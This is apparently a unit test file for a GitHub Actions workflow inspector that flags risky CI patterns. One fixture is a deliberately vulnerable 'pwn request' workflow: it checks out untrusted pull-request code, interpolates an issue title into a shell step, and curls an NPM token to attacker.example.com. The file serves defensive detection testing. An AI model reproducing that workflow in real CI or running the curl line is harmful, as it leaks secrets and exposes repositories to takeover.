"""Unit tests for the GitHub Actions workflow inspector."""
from __future__ import annotations

import textwrap
from pathlib import Path

from preprocessing.github_actions import (
    analyze_workflow,
    is_github_actions_workflow,
)


# ── Path matching ──────────────────────────────────────────────────────────


def test_path_match_canonical() -> None:
    assert is_github_actions_workflow(".github/workflows/ci.yml")
    assert is_github_actions_workflow(".github/workflows/release.yaml")


def test_path_match_with_repo_prefix() -> None:
    assert is_github_actions_workflow("my-repo/.github/workflows/lint.yml")
    assert is_github_actions_workflow(
        Path("nested/checkout/.github/workflows/test.yml")
    )


def test_path_match_rejects_non_workflow_yaml() -> None:
    assert not is_github_actions_workflow("docker-compose.yml")
    assert not is_github_actions_workflow("config/settings.yaml")
    assert not is_github_actions_workflow(".github/labeler.yml")


def test_path_match_rejects_action_yml() -> None:
    # action.yml at repo root or actions/*/action.yml is a composite-action
    # definition, not a workflow. v1 doesn't cover those.
    assert not is_github_actions_workflow("action.yml")
    assert not is_github_actions_workflow("actions/build/action.yml")


# ── Analysis: triggers ─────────────────────────────────────────────────────


_PWN_REQUEST_WORKFLOW = textwrap.dedent("""\
    name: ci
    on:
      pull_request_target:
        types: [opened, synchronize]
    jobs:
      test:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
            with:
              ref: ${{ github.event.pull_request.head.sha }}
          - uses: rando/some-action@main
          - name: Run
            run: |
              echo "${{ github.event.issue.title }}"
              curl -s "https://attacker.example.com/x?t=${{ secrets.NPM_TOKEN }}"
    """)


def test_analyze_pwn_request_pattern_full_signal_set() -> None:
    out = analyze_workflow(_PWN_REQUEST_WORKFLOW)
    assert out.is_valid
    assert out.has_pull_request_target
    assert "pull_request_target" in out.triggers

    # Two third-party actions: actions/checkout (1st-party — NOT counted),
    # rando/some-action (3rd-party, unpinned)
    assert len(out.third_party_actions) == 1
    assert out.third_party_actions[0]["action"] == "rando/some-action"
    assert out.third_party_actions[0]["sha_pinned"] == "false"
    assert out.n_unpinned_third_party == 1

    # Dangerous interpolation: github.event.issue.title goes into a run block
    assert any(
        "github.event.issue.title" in d for d in out.dangerous_interpolations
    )

    # Exfil heuristic: curl + secrets in same run-block
    assert out.has_exfil_verbs_with_secrets

    # Synthesized source surfaces every signal as comment lines
    syn = out.synthesized_source
    assert "pull_request_target" in syn
    assert "rando/some-action" in syn
    assert "NOT SHA-PINNED" in syn
    assert "exfiltration" in syn or "secrets" in syn


# ── Analysis: clean workflow ───────────────────────────────────────────────


_CLEAN_WORKFLOW = textwrap.dedent("""\
    name: ci
    on:
      push:
        branches: [main]
      pull_request:
        branches: [main]
    permissions:
      contents: read
    jobs:
      test:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@8e5e7e5ab8b370d6c329ec480221332ada57f0ab
          - uses: actions/setup-python@65d7f2d534ac1bc67fcd62888c5f4f3d2cb2b236
          - name: Test
            run: pytest
    """)


def test_analyze_clean_workflow_no_dangerous_signals() -> None:
    out = analyze_workflow(_CLEAN_WORKFLOW)
    assert out.is_valid
    assert not out.has_pull_request_target
    assert not out.has_workflow_run
    assert out.permissions_block_present
    assert not out.permissions_write_all
    assert out.n_unpinned_third_party == 0
    # actions/* is first-party; should NOT appear in third_party_actions
    assert out.third_party_actions == []
    assert out.dangerous_interpolations == []
    assert not out.has_exfil_verbs_with_secrets


# ── Analysis: write-all permissions ────────────────────────────────────────


def test_analyze_detects_write_all_permissions() -> None:
    workflow = textwrap.dedent("""\
        name: ci
        on: push
        permissions: write-all
        jobs:
          x:
            runs-on: ubuntu-latest
            steps:
              - run: echo hello
        """)
    out = analyze_workflow(workflow)
    assert out.permissions_block_present
    assert out.permissions_write_all
    assert "permissions: write-all" in out.synthesized_source


def test_analyze_detects_missing_permissions_block() -> None:
    workflow = textwrap.dedent("""\
        name: ci
        on: push
        jobs:
          x:
            runs-on: ubuntu-latest
            steps:
              - run: echo hello
        """)
    out = analyze_workflow(workflow)
    assert not out.permissions_block_present
    assert "NOT DECLARED" in out.synthesized_source


# ── Analysis: third-party SHA pinning detection ────────────────────────────


def test_third_party_with_v1_tag_is_unpinned() -> None:
    workflow = "uses: org/foo@v1\n"
    out = analyze_workflow(workflow)
    assert len(out.third_party_actions) == 1
    assert out.third_party_actions[0]["sha_pinned"] == "false"
    assert out.n_unpinned_third_party == 1


def test_third_party_with_sha_is_pinned() -> None:
    workflow = "uses: org/foo@8e5e7e5ab8b370d6c329ec480221332ada57f0ab\n"
    out = analyze_workflow(workflow)
    assert len(out.third_party_actions) == 1
    assert out.third_party_actions[0]["sha_pinned"] == "true"
    assert out.n_unpinned_third_party == 0


def test_local_action_not_counted_as_third_party() -> None:
    # Local / composite actions: ./.github/actions/foo
    workflow = "uses: ./.github/actions/build@main\n"
    out = analyze_workflow(workflow)
    # Local actions don't match the regex (path has dots/slashes that
    # aren't owner/repo shape) — should not be flagged as third-party.
    assert out.third_party_actions == []


def test_docker_action_not_counted_as_third_party() -> None:
    # Docker actions ``docker://image@digest`` are a different shape
    workflow = "uses: docker://busybox:latest\n"
    out = analyze_workflow(workflow)
    assert out.third_party_actions == []


# ── Analysis: empty / edge cases ───────────────────────────────────────────


def test_analyze_empty_text() -> None:
    out = analyze_workflow("")
    assert not out.is_valid
    assert out.parse_error == "empty_text"


def test_analyze_only_whitespace() -> None:
    out = analyze_workflow("   \n\n  ")
    assert not out.is_valid


# ── Analysis: ${{ }} sources we DON'T flag ─────────────────────────────────


def test_safe_interpolation_sources_not_flagged() -> None:
    # github.sha, github.run_id are server-controlled and benign.
    workflow = textwrap.dedent("""\
        on: push
        jobs:
          j:
            runs-on: ubuntu-latest
            steps:
              - run: echo "build ${{ github.sha }} run ${{ github.run_id }}"
        """)
    out = analyze_workflow(workflow)
    assert out.dangerous_interpolations == []
